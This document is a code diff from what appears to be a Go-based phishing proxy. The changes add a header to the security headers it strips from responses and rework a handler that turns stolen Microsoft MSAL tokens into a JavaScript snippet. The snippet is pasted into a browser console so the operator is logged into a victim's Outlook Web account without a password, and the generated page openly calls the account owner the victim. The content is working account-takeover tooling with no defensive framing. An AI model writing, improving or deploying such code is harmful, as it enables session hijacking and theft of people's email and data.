@@ -793,13 +793,14 @@ var _xo=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u
 
 	// Forward response headers, stripping security headers that break the proxy
 	skip := map[string]bool{
-		"content-length":            true,
-		"transfer-encoding":         true,
-		"connection":                true,
-		"content-security-policy":   true,
-		"x-content-type-options":    true,
-		"x-frame-options":           true,
-		"strict-transport-security": true,
+		"content-length":                   true,
+		"transfer-encoding":                true,
+		"connection":                       true,
+		"content-security-policy":          true,
+		"content-security-policy-report-only": true,
+		"x-content-type-options":           true,
+		"x-frame-options":                  true,
+		"strict-transport-security":        true,
 	}
 	for k, v := range resp.Header {
 		if !skip[strings.ToLower(k)] {
@@ -1174,20 +1175,29 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 		idtKey:     idtVal,
 	}
 
-	// Build the JS snippet
+	// Also add the MSAL account-keys index that some MSAL versions require
+	entries["msal.account.keys"] = []string{accountKey}
+
+	// Build JS snippet — writes to BOTH localStorage and sessionStorage
+	// because OWA's MSAL cacheLocation may be either
 	var js strings.Builder
-	js.WriteString("(function(){\n")
-	for k, v := range entries {
-		vb, _ := json.Marshal(v)
-		// json.Marshal the key and value so they're safe to embed
-		kb, _ := json.Marshal(k)
-		js.WriteString(fmt.Sprintf("  localStorage.setItem(%s, %s);\n", kb, string(vb)))
-	}
-	js.WriteString(`  console.log('%c✓ Tokens injected', 'color:green;font-weight:bold');` + "\n")
-	js.WriteString("  location.reload();\n")
-	js.WriteString("})();")
+	js.WriteString("(function(){\n  var d=")
+	entriesJSON, _ := json.Marshal(entries)
+	js.WriteString(string(entriesJSON))
+	js.WriteString(";\n")
+	js.WriteString(`  Object.keys(d).forEach(function(k){
+    var v=typeof d[k]==='string'?d[k]:JSON.stringify(d[k]);
+    try{localStorage.setItem(k,v);}catch(e){}
+    try{sessionStorage.setItem(k,v);}catch(e){}
+  });
+  console.log('%c✓ Session injected — reloading','color:#0a0;font-size:14px;font-weight:bold');
+  setTimeout(function(){location.reload();},400);
+})();`)
+
+	snippet := js.String()
 
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	snippetJSON, _ := json.Marshal(snippet) // safe JS string literal
 	fmt.Fprintf(w, `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
 <title>Session Inject — %s</title>
 <style>
@@ -1198,67 +1208,81 @@ h1{font-size:18px;color:#fff;margin-bottom:4px}
 .card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:6px;padding:18px 22px;margin-bottom:16px}
 h2{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:#555;margin-bottom:12px}
 .steps{list-style:none;counter-reset:s}
-.steps li{counter-increment:s;padding:8px 0 8px 36px;position:relative;font-size:13px;color:#bbb;border-bottom:1px solid #1c1c1c}
+.steps li{counter-increment:s;padding:10px 0 10px 38px;position:relative;font-size:13px;color:#bbb;border-bottom:1px solid #1c1c1c}
 .steps li:last-child{border-bottom:none}
-.steps li::before{content:counter(s);position:absolute;left:0;top:8px;background:#0078d4;color:#fff;width:22px;height:22px;border-radius:50%%;font-size:11px;font-weight:700;text-align:center;line-height:22px}
+.steps li::before{content:counter(s);position:absolute;left:0;top:10px;background:#0078d4;color:#fff;width:24px;height:24px;border-radius:50%%;font-size:11px;font-weight:700;text-align:center;line-height:24px}
 .steps a{color:#0078d4}
-.code{background:#111;border:1px solid #1a3a5c;border-radius:4px;padding:14px 16px;font-family:'Courier New',monospace;font-size:11px;color:#7ec8e3;white-space:pre-wrap;word-break:break-all;max-height:160px;overflow-y:auto;margin:10px 0 6px;cursor:pointer;user-select:all}
-.btn{padding:8px 20px;border-radius:4px;font-size:12px;font-weight:600;border:none;cursor:pointer;background:#0078d4;color:#fff;margin-right:8px}
-.b2{background:#1e1e1e;color:#bbb;border:1px solid #2a2a2a;text-decoration:none;display:inline-block}
-.ok{color:#5cb85c;font-size:12px;display:none;margin-left:6px}
+.steps strong{color:#fff}
+textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c;border-radius:4px;padding:12px 14px;font-family:'Courier New',monospace;font-size:11px;color:#7ec8e3;white-space:pre;height:130px;resize:none;outline:none;cursor:text}
+.row{display:flex;gap:8px;align-items:center;margin-top:10px;flex-wrap:wrap}
+.btn{padding:9px 22px;border-radius:4px;font-size:13px;font-weight:600;border:none;cursor:pointer;background:#0078d4;color:#fff;text-decoration:none;display:inline-block}
+.b2{background:#1e1e1e;color:#bbb;border:1px solid #2a2a2a}
+.ok{color:#5cb85c;font-size:13px;font-weight:600;display:none}
 .back{color:#666;font-size:12px;text-decoration:none;display:block;margin-bottom:16px}
+.note{font-size:11px;color:#555;margin-top:8px}
 </style></head><body>
 <a class="back" href="/dc/use/%s">&larr; Dashboard</a>
-<h1>One-Click Browser Login</h1>
-<p class="sub">Inject victim session into Outlook Web — no password needed</p>
+<h1>Inject Browser Session</h1>
+<p class="sub">Log into victim's Outlook from your browser — no password needed</p>
 <div class="card">
-<h2>Instructions</h2>
+<h2>Steps</h2>
 <ol class="steps">
-<li>Open <a href="https://outlook.office.com/mail/" target="_blank">https://outlook.office.com/mail/</a> in your browser (unauthenticated)</li>
-<li>Open DevTools: press <strong>F12</strong> → <strong>Console</strong> tab</li>
-<li>Copy the snippet below and paste it into the console, then press Enter</li>
-<li>The page reloads — you are now logged in as <strong>%s</strong></li>
+<li>Click <strong>Open OWA</strong> below — opens outlook.office.com in a new tab (not logged in yet)</li>
+<li>In that tab press <strong>F12</strong> → <strong>Console</strong> tab</li>
+<li>Click <strong>Copy Snippet</strong>, paste in the console and press <strong>Enter</strong></li>
+<li>Page reloads → you are logged in as <strong>%s</strong></li>
 </ol>
 </div>
 <div class="card">
-<h2>Paste into Browser Console (on outlook.office.com)</h2>
-<div class="code" id="snippet">%s</div>
-<button class="btn" onclick="copySnippet()">Copy Snippet</button>
-<a class="btn b2" href="https://outlook.office.com/mail/" target="_blank">Open OWA</a>
+<h2>Console Snippet</h2>
+<textarea class="code" id="ta" readonly>%s</textarea>
+<div class="row">
+<button class="btn" id="cpbtn" onclick="doCopy()">Copy Snippet</button>
+<a class="btn b2" href="https://outlook.office.com/mail/" target="_blank" onclick="doCopy()">Copy &amp; Open OWA</a>
 <span class="ok" id="ok">Copied!</span>
 </div>
-<div class="card">
-<h2>Details</h2>
-<div style="font-size:12px;color:#666;line-height:1.8">
-  <div>Target: <span style="color:#aaa">%s</span></div>
-  <div>OWA Client ID: <span style="color:#aaa">%s</span></div>
-  <div>Home Account: <span style="color:#aaa">%s</span></div>
-  <div>Scope: <span style="color:#aaa">%s</span></div>
+<p class="note">If copy fails: click inside the text box, press Ctrl+A then Ctrl+C</p>
 </div>
+<div class="card" style="font-size:12px;color:#555;line-height:1.9">
+  <div>Target: <span style="color:#888">%s</span></div>
+  <div>OWA Client ID: <span style="color:#888">%s</span></div>
+  <div>Home Account: <span style="color:#888">%s</span></div>
 </div>
 <script>
-var snippet = %q;
-function copySnippet(){
-  navigator.clipboard.writeText(snippet).then(function(){
-    var o=document.getElementById('ok');o.style.display='inline';
-    setTimeout(function(){o.style.display='none'},2000);
-  }).catch(function(){
-    document.getElementById('snippet').select();
-    document.execCommand('copy');
-  });
+var snippet=%s;
+var ta=document.getElementById('ta');
+function doCopy(){
+  /* try modern clipboard API (HTTPS only) */
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(snippet).then(showOk).catch(legacyCopy);
+  } else { legacyCopy(); }
 }
-document.getElementById('snippet').addEventListener('click', copySnippet);
+function legacyCopy(){
+  ta.select();
+  ta.setSelectionRange(0,99999);
+  try{
+    var ok=document.execCommand('copy');
+    if(ok) showOk();
+  }catch(e){}
+}
+function showOk(){
+  var o=document.getElementById('ok');
+  o.style.display='inline';
+  setTimeout(function(){o.style.display='none';},2500);
+}
+/* auto-select on click */
+ta.addEventListener('click',function(){ta.select();ta.setSelectionRange(0,99999);});
+ta.addEventListener('focus',function(){ta.select();ta.setSelectionRange(0,99999);});
 </script>
 </body></html>`,
 		template.HTMLEscapeString(upn),
 		template.HTMLEscapeString(landingToken),
 		template.HTMLEscapeString(upn),
-		template.HTMLEscapeString(js.String()),
+		template.HTMLEscapeString(snippet),
 		template.HTMLEscapeString(upn),
 		template.HTMLEscapeString(owaClientID),
 		template.HTMLEscapeString(homeAccountID),
-		template.HTMLEscapeString(scope),
-		js.String(),
+		string(snippetJSON),
 	)
 }
 
